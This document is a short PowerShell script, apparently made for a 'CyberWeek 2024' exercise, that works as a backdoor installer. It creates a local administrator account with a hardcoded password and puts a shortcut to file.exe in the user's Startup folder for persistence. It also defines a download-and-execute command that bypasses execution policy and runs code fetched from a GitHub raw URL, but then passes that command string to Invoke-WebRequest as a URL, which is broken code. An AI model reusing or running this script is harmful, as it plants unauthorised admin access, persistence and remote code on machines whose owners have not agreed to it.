# Variables for easy modification
$userName = "Cyberweek"
$password = "Cyberweek2024!"
$fullName = "Cyberweek 2024"
$group = "Administrators"
$exeFileName = "file.exe"
$shortcutName = "file.lnk"
$githubUrl = "Set-ExecutionPolicy Bypass -Scope Process -Force; Invoke-Expression ((New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/demiandjrn/CyberWeek2024/main/AV/file.txt"))"
$outputFileName = "file.txt"

# Add a new administrator user
New-LocalUser -Name $userName -Password $password -FullName $fullName

# Add the user to the Administrators group
Add-LocalUserToGroup -Group $group -Username $userName

# Get the current directory
$folder = Get-Location

# Path to the executable
$exePath = Join-Path -Path $folder -ChildPath $exeFileName

# Create a shortcut for the executable
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut("$exePath.lnk")
$shortcut.TargetPath = $exePath
$shortcut.Save()

# Get the startup folder path
$startupFolder = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("Startup"), $shortcutName)

# Copy the shortcut to the startup folder
Copy-Item -Path "$exePath.lnk" -Destination $startupFolder

# Remove the temporary shortcut from the current directory
Remove-Item "$exePath.lnk"

# Download a file from GitHub
$output = Join-Path -Path $PSScriptRoot -ChildPath $outputFileName
Invoke-WebRequest -Uri $githubUrl -OutFile $output 